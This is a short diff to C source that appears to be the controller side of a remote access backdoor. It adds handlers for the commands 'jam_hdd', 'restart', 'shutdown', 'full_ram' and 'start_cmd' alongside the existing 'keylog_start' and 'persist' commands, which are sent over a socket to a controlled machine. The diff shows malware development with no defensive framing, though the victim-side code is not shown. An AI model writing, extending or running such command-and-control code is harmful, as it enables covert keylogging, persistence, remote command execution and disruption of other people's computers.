@@ -56,6 +56,21 @@ int main()
         else if (strncmp("keylog_start", buffer, 12) == 0) {
             goto jump;
         }
+          else if (strncmp("jam_hdd", buffer, 7) == 0) {
+            goto jump;
+        }
+         else if (strncmp("restart", buffer, 7) == 0) {
+            goto jump;
+        }
+          else if (strncmp("shutdown", buffer, 8) == 0) {
+            goto jump;
+        }
+        else if (strncmp("full_ram", buffer, 8) == 0) {
+            goto jump;
+        }
+         else if (strncmp("start_cmd", buffer, 9) == 0) {
+            goto jump;
+        }
         else if (strncmp("persist", buffer, 7) == 0) {
             recv(client_socket, response, sizeof(response), 0);
             printf("%s", response);
